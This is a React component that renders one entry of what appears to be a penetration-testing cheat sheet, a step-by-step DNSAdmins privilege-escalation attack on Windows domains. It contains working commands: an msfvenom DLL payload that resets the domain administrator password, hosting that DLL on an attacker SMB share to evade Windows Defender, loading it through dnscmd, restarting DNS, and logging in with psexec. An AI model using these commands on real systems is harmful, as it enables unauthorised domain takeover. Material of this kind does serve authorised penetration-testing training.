import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const DNSAdmins = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Members of DNSAdmins group have access to network DNS information.
              Being a member of the DNSAdmins group allows us to use the
              dnscmd.exe to specify a plugin DLL that should be loaded by the
              DNS service.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Create a DLL using msfvenom, that changes the administrator
              password.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' - f dll > da.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Transfering this file will likely trigger Windows Defender, so we
              are going to use Impacket's smbserver.py.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sudo smbserver.py share ./"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Use dnscmd utility to set the DLL.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "cmd /c dnscmd localhost /config /serverlevelplugindll \\{IP}\\share\\da.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Restart the DNS service.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sc.exe stop dns"}
            </SyntaxHighlighter>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sc.exe start dns"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Login as Administrator with the new password we set.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sudo psexec.py {DOMAIN}/Administrator@{IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default DNSAdmins;
